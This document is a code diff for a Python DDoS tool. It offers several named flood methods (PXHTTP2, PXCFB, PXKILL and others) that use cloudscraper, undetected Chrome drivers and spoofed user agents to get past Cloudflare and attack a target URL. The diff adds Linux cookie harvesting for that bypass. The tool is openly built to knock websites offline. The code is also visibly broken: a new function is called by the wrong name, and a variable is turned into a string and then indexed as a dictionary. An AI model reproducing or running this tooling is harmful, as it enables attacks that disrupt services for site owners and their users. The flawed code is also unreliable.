@@ -2,8 +2,7 @@ import httpx, threading, cloudscraper, requests
 import argparse
 import undetected_chromedriver as uc
 import random, datetime, time
-import hashlib
-import base64
+import hashlib, base64, os
 from concurrent.futures import ThreadPoolExecutor
 from selenium import webdriver
 from fake_useragent import UserAgent
@@ -68,7 +67,7 @@ def random_headers():
 
     return random.choice(headers_list)
 
-def get_cookie(url):
+def get_cookie_windows(url):
     global useragent, cookieJAR, cookie
     options = webdriver.ChromeOptions()
     arguments = [
@@ -97,6 +96,22 @@ def get_cookie(url):
         time.sleep(1)
     driver.quit()
     return False
+
+def get_cookies_linux(url):
+    global cookieJAR
+    session = requests.Session()
+    headers = {
+        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en'
+    }
+    cookie_jar = RequestsCookieJar()
+    response = session.get(url, headers=headers, cookies=cookie_jar)
+    cookie_jar.update(session.cookies)
+    for cookie in cookie_jar:
+        cookieJAR['name']=cookie.name
+        cookieJAR['value']=cookie.value
+        cookieJAR=f"{cookie.name}={cookie.value}"
+
+    return cookie_jar
 
 class Method:
     class PXHTTP2:
@@ -375,9 +390,12 @@ class Method:
             self.time = time
             self.session = requests.Session()
             self.scraper = cloudscraper.create_scraper(disableCloudflareV1=True, sess=self.session, browser='chrome')
-            jar = RequestsCookieJar()
-            jar.set(cookieJAR['name'], cookieJAR['value'])
-            self.scraper.cookies = jar
+            if cookieJAR:
+                jar = RequestsCookieJar()
+                jar.set(cookieJAR['name'], cookieJAR['value'])
+                self.scraper.cookies = jar
+            else:
+                pass
 
         # Memulai thread untuk melakukan attack
         def Attack(self):
@@ -476,5 +494,5 @@ if __name__ == '__main__':
     parser.add_argument('-tpe', '--tpe', type=str, help='ThreadPoolExecutor', metavar='150-300', default=150)
     parser.add_argument('-m', '--method', type=str, help='DDoS Method', metavar='PXHTTP2, HTTP2, PXCFB, PXREQ, PXBYP, PXROCKET, PXMIX, PXCFPRO, PXKILL', required=True)
     args = parser.parse_args()
-    get_cookie(str(args.url))
+    get_cookie_windows(str(args.url)) if os.name == 'nt' else get_cookie_linux(str(args.url))
     threading.Thread(target=Runner.start()).start()
